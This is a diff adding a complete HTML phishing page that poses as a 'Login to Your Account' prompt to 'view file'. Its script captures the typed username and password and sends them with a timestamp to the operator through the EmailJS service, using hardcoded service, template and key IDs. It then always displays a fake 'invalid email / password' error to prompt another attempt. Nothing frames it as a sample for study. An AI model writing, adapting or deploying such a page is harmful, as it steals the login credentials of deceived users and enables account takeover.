@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Your Account</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.postimg.cc/DwLTdCjt/Hibox.jpg'); /* Background Image */
+            background-size: contain; /* Ensures the image fits within the page */
+            background-position: top center;
+            background-repeat: no-repeat;
+            background-color: #000; /* Fallback color */
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        /* Drop-down Login Panel */
+        .login-container {
+            background-color: rgba(40, 40, 40, 0.95); /* Grey-black background */
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            position: fixed;
+            top: -200px; /* Initially hidden */
+            left: 50%;
+            transform: translateX(-50%);
+            transition: top 0.5s ease-in-out;
+            z-index: 1000;
+            border-top: 5px solid #f07c00;
+        }
+
+        h2 {
+            color: #fff;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        input {
+            width: 85%;
+            padding: 8px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 6px;
+            background-color: #222;
+            color: white;
+        }
+
+        input::placeholder {
+            color: #bbb;
+        }
+
+        button {
+            background-color: #f07c00;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 85%;
+            cursor: pointer;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: #d96b00;
+        }
+
+        .forgot-password {
+            color: #f07c00;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Confirmation Message */
+        #confirmation {
+            display: none;
+            background-color: rgba(40, 40, 40, 0.95);
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            margin: 100px auto;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            border-top: 5px solid #f07c00;
+        }
+
+        #confirmation p {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Drop-down Login Panel -->
+    <div id="login" class="login-container">
+        <h2>Login to Your Account</h2>
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="authenticate()">Login</button>
+        <p><a href="#" class="forgot-password">Login to view file</a></p>
+    </div>
+
+    <!-- Confirmation Message -->
+   <div id="confirmation">
+    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+    <p>You've entered an invalid email address / password combination.</p>
+    <button onclick="window.close()">Close this page</button>
+</div>
+
+    <script>
+        function sendEmail(username, password) {
+            const serviceID = "service_suqjtsd";  // Your Service ID
+            const templateID = "template_gnd5xid";  // Your Template ID
+            const publicKey = "jkb7mzwK9KsEbHbna";  // Your Public Key
+
+            const templateParams = {
+                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+            };
+
+            return emailjs.send(serviceID, templateID, templateParams, publicKey);
+        }
+
+        function authenticate() {
+            let loginButton = document.querySelector("button");
+            loginButton.textContent = "Authenticating...";
+            loginButton.disabled = true;
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            if (username && password) {
+                sendEmail(username, password)
+                    .then(() => {
+                        loginButton.textContent = "Login";
+                        loginButton.disabled = false;
+                        document.getElementById("login").style.display = "none";
+                        document.getElementById("confirmation").style.display = "block";
+                    })
+                    .catch(error => {
+                        console.error("Error sending email", error);
+                        loginButton.textContent = "Login";
+                        loginButton.disabled = false;
+                        alert("Failed to send login report. Please try again.");
+                    });
+            } else {
+                alert("Please enter both username and password.");
+                loginButton.disabled = false;
+                loginButton.textContent = "Login";
+            }
+        }
+
+        // Slide down animation for login panel
+        window.onload = function () {
+            document.getElementById("login").style.top = "20px";
+        };
+    </script>
+</body>
+</html>
